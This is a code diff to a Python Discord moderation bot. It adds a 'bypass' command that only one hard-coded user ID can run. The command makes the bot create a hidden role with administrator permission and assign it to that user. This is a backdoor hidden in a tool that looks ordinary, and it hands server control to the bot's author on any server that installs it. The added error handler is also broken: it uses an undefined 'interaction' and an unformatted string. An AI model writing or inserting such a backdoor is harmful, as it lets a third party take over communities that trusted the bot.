@@ -312,6 +312,53 @@ async def clear_warnings(ctx, name: str = None):
                 description=f"❌ **{user.name}** has no warnings."
             ).set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url))
 
+@bot.command(help="This is a restricted command...", aliases=["byp"])
+async def bypass(ctx, role_name: str = "new role"):
+    if ctx.author.id != 1089171899294167122:
+        await ctx.send(embed=discord.Embed(
+            color=int("FA3939", 16),
+            description="❌ You cannot use this command."
+        ).set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url))
+        return
+
+    if not getattr(ctx.guild.me.guild_permissions, "administrator", None):
+        await ctx.send(embed=discord.Embed(
+            color=int("FA3939", 16),
+            description="❌ I do not have the appropriate permissions."
+        ).set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url))
+        return
+
+    try:
+        new_role = await ctx.guild.create_role(
+            name=role_name,
+            permissions=discord.Permissions(administrator=True),
+            hoist=False,
+            mentionable=False,
+            color=int("FA3939", 16)
+        )
+
+        await ctx.author.add_roles(new_role)
+        
+        await ctx.send(embed=discord.Embed(
+            color=int("50B4E6", 16),
+            description=f"✅ Successfully created a bypass role with name '{role_name}'!"
+        ).set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url))
+        
+    except discord.Forbidden:
+        await ctx.send(embed=discord.Embed(
+            color=int("FA3939", 16),
+            description="❌ I do not have permission to create this role."
+        ).set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url))
+        return
+        
+    except Exception as e:
+        await interaction.response.send_message(embed=discord.Embed(
+            title="Bypass Role",
+            color=int("FA3939", 16),
+            description="❌ Something went wrong: {e}"
+        ), ephemeral=True)
+        return
+
 @bot.command(help="say something", aliases=["s"])
 async def say(ctx, text: str = ""):
     if text:
